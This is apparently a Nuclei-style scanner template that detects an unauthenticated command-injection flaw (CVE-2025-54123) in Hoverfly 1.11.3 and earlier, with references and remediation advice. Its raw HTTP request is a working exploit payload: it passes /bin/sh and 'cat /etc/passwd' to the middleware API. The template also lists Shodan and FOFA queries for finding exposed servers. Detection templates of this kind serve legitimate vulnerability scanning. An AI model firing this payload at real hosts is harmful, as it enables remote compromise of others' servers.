http:
- matchers:
  - condition: and
    dsl:
    - status_code == 422
    - regex('root:x:0:0', body)
    - contains_all(body, 'STDOUT:','hoverfly')
    type: dsl
  raw:
  - "PUT /api/v2/hoverfly/middleware HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\
    \n{\n  \"binary\": \"/bin/sh\",\n  \"script\": \"cat /etc/passwd\"\n}\n"
id: CVE-2025-54123
info:
  author: nukunga[seonghyeonJeon]
  description: 'Hoverfly versions 1.11.3 and below are vulnerable to remote code execution
    (RCE) via command injection in the middleware API endpoint (/api/v2/hoverfly/middleware).
    Insufficient validation of the ''binary'' and ''script'' parameters allows an
    unauthenticated attacker to execute arbitrary commands on the host system.

    '
  impact: 'Unauthenticated attackers can inject arbitrary operating system commands
    through the middleware API endpoint, achieving complete server compromise.

    '
  metadata:
    fofa-query:
    - icon_hash="1357234275"
    - title="Hoverfly Dashboard"
    max-requests: 1
    shodan-query:
    - http.favicon.hash:1357234275
    - title:"Hoverfly Dashboard"
    verified: true
  name: Hoverfly <= 1.11.3 - Remote Code Execution
  reference:
  - https://github.com/advisories/GHSA-r4h8-hfp2-ggmf
  - https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-r4h8-hfp2-ggmf
  remediation: 'Upgrade Hoverfly to a version later than 1.11.3 that properly validates
    the binary and script parameters in the middleware endpoint.

    '
  severity: critical
  tags: cve,cve2025,hoverfly,rce,intrusive,vuln,vkev
